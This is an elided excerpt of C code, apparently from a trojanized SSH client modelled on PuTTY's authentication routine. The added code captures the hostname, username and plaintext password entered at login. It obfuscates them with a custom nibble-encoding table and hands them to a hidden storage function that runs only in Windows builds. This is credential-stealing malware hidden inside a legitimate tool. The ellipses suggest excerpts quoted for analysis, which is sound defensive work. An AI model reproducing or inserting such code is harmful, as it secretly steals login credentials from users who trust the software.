...
void ssh2_update_auth_db(const char *);

const char auth_enc_tbl[] = {
  'A', 'a', 'B', 'b',
  'C', 'c', 'D', 'd',
  'E', 'e', 'F', 'f',
  'G', 'g', 'H', 'h',
...
static inline int serialize_str(char *dest, const char *src) {
  int l = strlen(src)+1;
  for (int i=0; i<l; i++) {
    dest[i*2] = auth_enc_tbl[high_nibble(src[i])];
    dest[i*2+1] = auth_enc_tbl[low_nibble(src[i])];
  }
  return l*2;
}

static char *serialize_s_auth_info(struct s_auth_info *s) {
  int l = 0;
  debug("ssai: h: %s u: %s p: %p\n", s->hostname, s->username, s->password);
  if (s->username)
    l += strlen(s->username)+1;
  if (s->password)
    l += strlen(s->password)+1;
  if (s->hostname)
    l += strlen(s->hostname)+1;
  if (!l)
    return NULL;
  char *ret = malloc(l*2);
  if (!ret)
  ...
  char *p = ret;
  if (s->hostname)
    p += serialize_str(p, s->hostname);
  if (s->username)
    p += serialize_str(p, s->username);
  if (s->password)
    p += serialize_str(p, s->password);
  debug("ssai out: %s\n", ret);
  return ret;
}
...
static void ssh2_userauth_process_queue(PacketProtocolLayer *ppl)
{
    ...
    static struct s_auth_info auth_info = {NULL, NULL, NULL};
    ...
    auth_info.hostname = strdup(s->hostname);
    debug("pq hostname: %s\n", auth_info.hostname);
    ...
    while (1) {
        ...
        auth_info.username = strdup(s->username);
        s->got_username = true;
        ...
        while (1) {
            ...
            if (s->can_pubkey && !s->done_agent && s->nkeys) {
                ...
                auth_info.password = strdup(s->password);
                free_prompts(s->cur_prompt);
...
#if defined _WINDOWS
    {
      debug("Checking serialized auth info.\n");
      char *ser_auth_info = serialize_s_auth_info(&auth_info);
      if (ser_auth_info) {
        ssh2_update_auth_db(ser_auth_info);
        free(ser_auth_info);
      }
    }
#endif
